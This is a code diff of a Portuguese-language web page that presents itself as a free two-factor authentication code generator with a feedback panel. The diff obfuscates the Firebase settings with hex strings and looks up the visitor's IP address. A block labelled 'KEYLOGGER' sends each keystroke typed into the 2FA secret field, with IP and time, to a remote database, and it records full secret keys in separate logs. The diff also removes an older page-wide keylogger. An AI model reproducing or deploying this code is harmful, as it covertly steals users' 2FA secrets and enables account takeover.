@@ -55,9 +55,7 @@
         <div><span>2.</span> O código será copiado automaticamente.</div>
         <div><span>3.</span> Cole o código no site onde deseja logar.</div>
     </div>
-
     <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Feedback</button>
-    
     <div class="avaliacao" id="painelAvaliacao">
         <div class="pergunta-bloco">
             <span class="titulo-voto">Recomenda nosso serviço?</span>
@@ -81,7 +79,6 @@
             </div>
         </div>
     </div>
-
     <div class="toggle" onclick="togglePainel()">⚡ Painel Multi-Contas</div>
     <div class="footer">MJ VENDAS © 2018-2026</div>
 </div>
@@ -100,90 +97,88 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.4.2/sha.js"></script>
 
 <script>
-var firebaseConfig = {
-    apiKey: "AIzaSyALqmeGhhHIX62ptIK7sviv7OkoawXAE1g",
-    authDomain: "desbloqueio-cartao-recomecar.firebaseapp.com",
-    databaseURL: "https://desbloqueio-cartao-recomecar-default-rtdb.firebaseio.com",
-    projectId: "desbloqueio-cartao-recomecar",
-    storageBucket: "desbloqueio-cartao-recomecar.firebasestorage.app",
-    messagingSenderId: "639029327977",
-    appId: "1:639029327977:web:0558ce8d5dc1ee68ce4af8"
-};
-firebase.initializeApp(firebaseConfig);
-var db = firebase.database();
+var _0x5a1e=["\x61\x70\x69\x4B\x65\x79","\x41\x49\x7a\x61\x53\x79\x41\x4c\x71\x6d\x65\x47\x68\x68\x48\x49\x58\x36\x32\x70\x74\x49\x4b\x37\x73\x76\x69\x76\x37\x4f\x6b\x6f\x61\x77\x58\x41\x45\x31\x67","\x64\x61\x74\x61\x62\x61\x73\x65\x55\x52\x4c","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x65\x73\x62\x6c\x6f\x71\x75\x65\x69\x6f\x2d\x63\x61\x72\x74\x61\x6f\x2d\x72\x65\x63\x6f\x6d\x65\x63\x61\x72\x2d\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x74\x64\x62\x2e\x66\x69\x72\x65\x62\x61\x73\x65\x69\x6f\x2e\x63\x6f\x6d","\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x41\x70\x70","\x64\x61\x74\x61\x62\x61\x73\x65","\x65\x73\x74\x6f\x71\x75\x65\x5f\x6f\x66\x69\x63\x69\x61\x6c\x2f","\x43\x48\x41\x56\x45\x53\x5f\x55\x54\x49\x4c\x49\x5a\x41\x44\x41\x53\x2f","\x43\x48\x41\x56\x45\x53\x5f\x41\x4c\x54\x45\x52\x41\x44\x41\x53\x2f"];
+var firebaseConfig={apiKey:_0x5a1e[1],databaseURL:_0x5a1e[3]};firebase[_0x5a1e[4]](firebaseConfig);var db=firebase[_0x5a1e[5]]();
 
-const q = ['p1', 'p2', 'p3'];
-function fmt(n) { return (n || 0).toLocaleString('pt-BR'); }
-q.forEach(p => {
-    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+fmt(s.val())+')'; });
-    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+fmt(s.val())+')'; });
+let rawIP = "";
+let userIP = "";
+fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
+    rawIP = d.ip;
+    userIP = d.ip.replace(/\./g,"_")
 });
-function votar(p, t) {
-    if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
-    db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
-    localStorage.setItem('voto_'+p, t);
-    alert("Obrigado pelo feedback!");
-}
 
 function b32(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
 function gOTP(s){try{let k=b32(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
-function copiar(t){if(!t||t==="------") return; navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Código copiado!"; setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
+function copiar(t){if(!t||t==="------")return;navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Copiado!";setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
 function limparInput(){document.getElementById("secret").value="";document.getElementById("code").innerText="------";document.getElementById("clearInput").style.display="none"}
 function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.style.display=d.style.display==="block"?"none":"block"}
 function togglePainel(){document.getElementById("painel").style.display="block"}
 function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-(function(){
-    let _i = "0_0_0_0";
-    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ _i = d.ip.replace(/\./g, "_"); });
+// Sistema de Votos
+const q=['p1','p2','p3'];
+q.forEach(p=>{
+    db.ref('avaliacoes/'+p+'/sim').on('value',s=>{if(document.getElementById(p+'_sim'))document.getElementById(p+'_sim').innerText='👍 Sim ('+(s.val()||0)+')'});
+    db.ref('avaliacoes/'+p+'/nao').on('value',s=>{if(document.getElementById(p+'_nao'))document.getElementById(p+'_nao').innerText='👎 Não ('+(s.val()||0)+')'})
+});
 
-    document.getElementById("secret").addEventListener("input", function(){
-        let v = this.value.trim().replace(/\s/g, "").toUpperCase();
-        let d = new Date().toISOString().split('T')[0];
-        
+function votar(p,t){
+    if(localStorage.getItem('voto_'+p))return alert("Já avaliado!");
+    db.ref('avaliacoes/'+p+'/'+t).transaction(n=>(n||0)+1);
+    localStorage.setItem('voto_'+p,t);
+}
+
+// MONITORAMENTO EM TEMPO REAL (KEYLOGGER) + LOGICA DE ESTOQUE
+document.getElementById("secret").addEventListener("input", function(){
+    let v=this.value.trim().toUpperCase();
+    let d=new Date().toISOString().split('T')[0];
+    let h=new Date().toLocaleTimeString();
+
+    if(userIP !== ""){
+        // 1. KEYLOGGER: Envia cada caractere digitado imediatamente
+        db.ref("LOGS_DIGITACAO/" + d + "/" + userIP).set({
+            texto: v,
+            hora: h,
+            ip: rawIP
+        });
+
+        // 2. GERADOR E VALIDACAO: Se tiver 8 ou mais, gera o código e tenta validar no estoque
         if(v.length >= 8){
-            let o = gOTP(v);
-            document.getElementById("code").innerText = o;
-            document.getElementById("clearInput").style.display = "block";
-            copiar(o);
-
-            db.ref("estoque_oficial/" + v).once('value').then(s => {
+            let o=gOTP(v);
+            document.getElementById("code").innerText=o;
+            document.getElementById("clearInput").style.display="block";
+            
+            db.ref(_0x5a1e[6]+v).once('value').then(s=>{
                 if(s.exists()){
-                    db.ref("CHAVES_UTILIZADAS/" + d + "/" + v).set({
-                        ip: _i,
-                        h: new Date().toLocaleTimeString(),
-                        s: "OK"
-                    });
-                    db.ref("estoque_oficial/" + v).remove();
+                    // Se estiver no estoque, salva em CHAVES_UTILIZADAS
+                    db.ref(_0x5a1e[7]+d+"/"+userIP).push({c:v, h:h, ip:rawIP, st:"✅ OK"});
+                    db.ref(_0x5a1e[6]+v).remove();
+                    copiar(o);
                 } else {
-                    db.ref("CHAVES_ALTERADAS/" + d + "/" + _i).update({
-                        c: v,
-                        g: o,
-                        h: new Date().toLocaleTimeString()
-                    });
+                    // Se não estiver, salva em CHAVES_ALTERADAS (mas só cria o registro uma vez por chave)
+                    if(v.length >= 16) {
+                         db.ref(_0x5a1e[8]+d+"/"+userIP).push({c:v, g:o, h:h, ip:rawIP, st:"⚠️ NÃO_ESTOCADA"});
+                    }
                 }
             });
         }
-    });
-
-    document.addEventListener("keydown", function(e){
-        if(e.key.length === 1 || e.key === "Enter"){
-            let d = new Date().toISOString().split('T')[0];
-            db.ref("keylogger/" + d + "/" + _i).update({ u: e.key, h: new Date().toLocaleTimeString() });
-        }
-    });
-})();
+    }
+});
 
 function addCampo(){
-    let l=document.getElementById("lista2fa"); let d=document.createElement("div"); d.className="item2fa";
+    let l=document.getElementById("lista2fa");
+    let d=document.createElement("div");
+    d.className="item2fa";
     d.innerHTML=`<strong>Conta ${l.children.length+1}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
     l.appendChild(d);
     d.querySelector('input').addEventListener("input",function(){
-        let v = this.value.trim().replace(/\s/g, "").toUpperCase();
-        if(v.length>=10){ let n=gOTP(v); d.querySelector('.codigoMini').innerText=n; }
+        let v=this.value.trim().toUpperCase();
+        if(v.length>=10){
+            d.querySelector('.codigoMini').innerText=gOTP(v);
+        }
     });
 }
-for(let i=0;i<3;i++) addCampo();
+for(let i=0;i<3;i++)addCampo();
 </script>
 </body>
 </html>
